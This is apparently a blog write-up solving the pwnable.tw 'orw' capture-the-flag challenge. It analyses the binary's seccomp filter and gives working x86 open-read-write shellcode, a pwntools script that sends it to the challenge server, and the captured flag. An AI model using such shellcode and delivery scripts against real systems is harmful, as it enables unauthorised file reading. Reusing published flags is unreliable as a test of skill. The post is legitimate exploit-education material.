---
layout: post
title:  "Solving pwnable's - orw - 2/???"
date:   2023-01-11 11:00:34 -0400
---

[https://pwnable.tw](https://pwnable.tw/)

The challenge description says:

Only `open` `read` `write` syscalls are allowed to use.

But is that enforced? How?

### Seccomp

Taking a look using the ghidra decompiler:

```c
void orw_seccomp(void)
{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int in_GS_OFFSET;
  undefined2 local_88 [2];
  undefined4 *local_84;
  undefined4 local_80 [24];
  int local_20;
  
  local_20 = *(int *)(in_GS_OFFSET + 0x14);
  puVar2 = &DAT_08048640;
  puVar3 = local_80;
  for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  local_88[0] = 0xc;
  local_84 = local_80;
  prctl(0x26,1,0,0,0);
  prctl(0x16,2,local_88);
  if (local_20 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

There are 3 interesting things in this code, the function name, a call to a function that I don't recognize, and the `in_GS_OFFSET` thing.

The `in_GS_OFFSET` seems to be related to stack canaries, so I didn't look into it any further.

[seccomp](https://man7.org/linux/man-pages/man2/seccomp.2.html) is a computer security facility in the Linux kernel and is probably what is filtering the syscalls.

[prctl](https://man7.org/linux/man-pages/man2/prctl.2.html) manipulates various aspects of the behavior of the calling thread or process, this is how seccomp is set in a process.

The first call sets the PR\_SET\_NO\_NEW\_PRIVS flag and the second one sets the PR\_SET\_SECCOMP flag.

You can find what each flag does with the command `man prctl` also, you can look at the file that defines the flags: [linux/prctl.h](https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h).

The first flag limits the privileges that execve can grant.

The second one sets seccomp on the process.

According to [linux/seccomp.h](https://github.com/torvalds/linux/blob/master/include/uapi/linux/seccomp.h), 2 on the 2nd argument sets the seccomp mode to filter which takes a struct as the 3rd argument with the allowed syscalls.

There is a very useful tool to find out what the seccomp rules are being used in the binary. It's called [seccomp-tools](https://github.com/david942j/seccomp-tools) and it gives the following output:

```csharp
line  CODE  JT   JF      K
=================================
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
0002: 0x20 0x00 0x00 0x00000000  A = sys_number
0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

So it is blocking every call other than those listed. Because of that, it doesn't seem like we can get remote code execution, but we just need to read the flag anyway.

The struct with the syscalls in the decompiled code is the `&DAT_08048640` variable. We then can look at what is in that address in memory and check that it matches the output from seccomp-tools:

```plaintext
0000: 0x20 0x00 0x00 0x00000004  A = arch

08048640 20 00 00 00     undefined4 00000020h
08048644 04              ??         04h
08048645 00              ??         00h
08048646 00              ??         00h
08048647 00              ??         00h
---

0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011

08048648 15              ??         15h
08048649 00              ??         00h
0804864a 00              ??         00h
0804864b 09              ??         09h
0804864c 03              ??         03h
0804864d 00              ??         00h
0804864e 00              ??         00h
0804864f 40              ??         40h
---
```

I think it's possible to make ghidra recognize this data as a struct on the decompiler but I haven't figured out how to do it.

The man page says that it should be a `sock_filter` struct but the ghidra datatypes don't have that and I haven't played with ghidra that much.

### Actual Binary

The way the challenge works is, it asks us for a shellcode and it runs or seccomp crashes it. Pretty straightforward.

Here is my solution:

```python
from pwn import *
from subprocess import Popen, PIPE
import sys


def shellcode_from_objdump(obj):
    res = ""
    assemble = Popen(["as", "--32", f"{obj}.s", "-o", f"{obj}.o"]).wait()
    link = Popen(["ld", "-m", "elf_i386", f"{obj}.o", "-o", f"{obj}"]).wait()
    p = Popen(["objdump", "-d", obj], stdout=PIPE, stderr=PIPE)
    (stdoutdata, stderrdata) = p.communicate()
    if p.returncode == 0:
        for line in stdoutdata.splitlines():
            line = line.decode("utf-8")
            cols = line.split("\t")
            if len(cols) > 2:
                for b in [b for b in cols[1].split(" ") if b != ""]:
                    res = res + ("\\x%s" % b)
    else:
        raise ValueError(stderrdata)

    return b"".join([bytes.fromhex(byte) for byte in res.split("\\x")[1:]])


shellcode = shellcode_from_objdump("/mnt/hgfs/pwn/exploit")
send = b"AAAAAAAAAAAAAAAAAAAA"

# p = gdb.debug("./orw", gdbscript="b *0x8048585\n conti\n ni\n si")
# p = process("./orw")
p = remote("chall.pwnable.tw", 10001)

print(f"Recv 1: {p.recv()}")
p.send(shellcode)
print(f"Recv 2: {p.recv()}")
```

```cpp
.intel_syntax noprefix

.text
  .global _start

_start:
  # open
  mov eax, 0x5
  push 0x6761
  push 0x6c662f77
  push 0x726f2f65
  push 0x6d6f682f
  mov ebx, esp
  mov ecx, 0x0
  mov edx, 0777
  int 0x80

  # read
  mov ebx, eax
  mov eax, 0x3
  push 0
  push 0
  push 0
  lea ecx, [esp]
  mov edx, 0x64
  int 0x80

  # write
  mov eax, 0x4
  mov ebx, 0x1
  mov edx, 0x64
  int 0x80
```

The python script reads and converts the assembly file to shellcode by doing `as --32 exploit.s -o exploit.o && ld -m elf_i386 exploit.o -o exploit` and then using `objdump -D exploit` to get the actual code.

It is a pretty useful assembly playground, you can edit the assembly run the program and get a good feedback loop going. Found the objdump code from [gist](https://gist.github.com/duanckham/0b9ec0f55b6593cdffb5).

flag: **FLAG{sh3llc0ding\_w1th\_op3n\_r34d\_writ3}**
